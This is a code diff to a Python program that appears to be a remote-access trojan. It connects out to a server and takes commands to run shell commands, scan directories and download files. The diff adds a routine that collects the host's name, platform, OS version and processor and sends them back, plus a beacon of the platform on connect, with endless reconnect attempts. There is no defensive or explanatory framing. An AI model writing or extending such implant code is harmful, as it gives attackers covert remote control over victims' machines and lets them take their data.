@@ -1,5 +1,5 @@
+import platform
 import socket
-import base64
 import json
 import time
 import os
@@ -45,6 +45,16 @@ def scan_dir(server, path): # Scan directory
     send_dyn_socket(server, entire_dir)
 
 
+def get_info(server): # Get system info
+    send_info = json.dumps({
+        'node': platform.node(),
+        'platform': platform.platform(),
+        'version': platform.version(),
+        'processor': platform.processor()
+    })
+    send_dyn_socket(server, send_info)
+
+
 def download_file(server, filepath):
     if os.path.exists(filepath):
         print(filepath)
@@ -69,6 +79,8 @@ def tcpClient(client):
                     exec_shell(client, json_data['content'])
                 case 'scandir':
                     scan_dir(client, json_data['content'])
+                case 'info':
+                    get_info(client)
                 case 'downfile':
                     download_file(client, json_data['content'])
         except:
@@ -84,8 +96,13 @@ def connect():
         client = socket.socket()
         client.connect((host, port))
         print('server connected')
+        client.send(json.dumps({
+            'type': 'client',
+            'content': platform.platform()
+        }).encode())
         tcpClient(client)
-    except:
+    except socket.error as e:
+        print(e.strerror)
         time.sleep(1)
         connect()
 
